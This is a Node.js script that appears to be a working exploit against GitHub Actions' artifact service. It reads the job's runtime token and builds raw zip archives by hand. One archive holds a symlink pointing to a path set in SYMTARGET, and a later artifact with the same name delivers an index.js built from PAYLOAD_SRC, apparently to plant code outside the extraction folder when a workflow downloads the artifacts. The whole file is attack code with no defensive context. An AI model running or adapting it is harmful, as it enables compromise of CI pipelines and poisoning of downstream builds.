const https = require('https');
const zlib = require('zlib');
const crypto = require('crypto');

const CRC_TABLE = (() => {
  const t = new Int32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c;
  }
  return t;
})();
function crc32(buf) {
  let c = 0 ^ (-1);
  for (let i = 0; i < buf.length; i++) c = (c >>> 8) ^ CRC_TABLE[(c ^ buf[i]) & 0xFF];
  return (c ^ (-1)) >>> 0;
}

function b64urlDecode(s) {
  s = s.replace(/-/g, '+').replace(/_/g, '/');
  return Buffer.from(s, 'base64').toString('utf8');
}

function httpJson(url, token, body) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const data = Buffer.from(JSON.stringify(body));
    const req = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length,
        'Authorization': 'Bearer ' + token
      }
    }, res => {
      let out = '';
      res.on('data', c => out += c);
      res.on('end', () => resolve({status: res.statusCode, body: out}));
    });
    req.on('error', reject);
    req.write(data); req.end();
  });
}

// builds a zip with a symlink entry
function makeZip(entries) {
  const chunks = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8');
    const content = Buffer.from(e.content, 'utf8');
    const crc = crc32(content);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(crc >>> 0, 14);
    local.writeUInt32LE(content.length, 18);
    local.writeUInt32LE(content.length, 22);
    local.writeUInt16LE(name.length, 26);
    local.writeUInt16LE(0, 28);
    chunks.push(local, name, content);
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE((3 << 8) | 20, 4); // made by unix
    cd.writeUInt16LE(20, 6);
    cd.writeUInt16LE(0, 8);
    cd.writeUInt16LE(0, 10);
    cd.writeUInt16LE(0, 12);
    cd.writeUInt16LE(0, 14);
    cd.writeUInt32LE(crc >>> 0, 16);
    cd.writeUInt32LE(content.length, 20);
    cd.writeUInt32LE(content.length, 24);
    cd.writeUInt16LE(name.length, 28);
    cd.writeUInt32LE(e.mode >>> 0, 38); // external attrs: mode << 16
    cd.writeUInt32LE(offset, 42);
    central.push(cd, name);
    offset += local.length + name.length + content.length;
  }
  const cdBuf = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...chunks, cdBuf, end]);
}

function putBlob(url, buf, contentType) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: {
        'x-ms-blob-type': 'BlockBlob',
        'Content-Type': contentType,
        'Content-Length': buf.length,
        'x-ms-version': '2021-12-02'
      }
    }, res => {
      let out = '';
      res.on('data', c => out += c);
      res.on('end', () => resolve({status: res.statusCode, body: out}));
    });
    req.on('error', reject);
    req.write(buf); req.end();
  });
}

async function upload(name, zipBuf) {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const claims = JSON.parse(b64urlDecode(token.split('.')[1]));
  let runId = null, jobId = null;
  for (const s of (claims.scp || '').split(' ')) {
    if (s.startsWith('Actions.Results:')) {
      const p = s.split(':');
      runId = p[1]; jobId = p[2];
    }
  }
  const candidates = [
    {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7, mime_type: {value: 'application/zip'}},
    {workflowRunBackendId: runId, workflowJobRunBackendId: jobId, name, version: 7},
    {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7},
    {workflowRunBackendId: runId, workflowJobRunBackendId: jobId, name, version: '7', mimeType: {value: 'application/zip'}},
    {workflowRunBackendId: runId, workflowJobRunBackendId: jobId, name, version: 4, mimeType: {value: 'application/zip'}}
  ];
  let create = null;
  for (const body of candidates) {
    const r = await httpJson(`${base}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`, token, body);
    console.log(`CREATE_TRY ${JSON.stringify(Object.keys(body))} -> ${r.status} ${r.body.slice(0, 200)}`);
    if (r.status === 200) { create = r; break; }
  }
  console.log(`CREATE[${name}] ${create ? create.status : 'none'}`);
  if (!create) return;
  const parsed = JSON.parse(create.body);
  const url = parsed.signedUploadUrl || parsed.signed_upload_url;
  const put = await putBlob(url, zipBuf, 'application/zip');
  console.log(`PUT[${name}] ${put.status} ${put.body.slice(0, 200)}`);
  const fin = await httpJson(`${base}/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact`, token, {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: name,
    size: String(zipBuf.length),
    hash: {value: 'sha256:' + crypto.createHash('sha256').update(zipBuf).digest('hex')}
  });
  console.log(`FINAL[${name}] ${fin.status} ${fin.body.slice(0, 300)}`);
}

(async () => {
  const target = process.env.SYMTARGET;
  const symZip = makeZip([{name: 'x', content: target, mode: 0o120777 * 65536}]);
  await upload('.', symZip);
  const payloadZip = makeZip([{name: 'index.js', content: process.env.PAYLOAD_SRC, mode: 0o100644 * 65536}]);
  await upload('x', payloadZip);
  const fillerZip = makeZip([{name: 'f.txt', content: 'filler', mode: 0o100644 * 65536}]);
  await upload('y', fillerZip);
})().catch(e => { console.log('ERROR ' + e.stack); process.exit(1); });
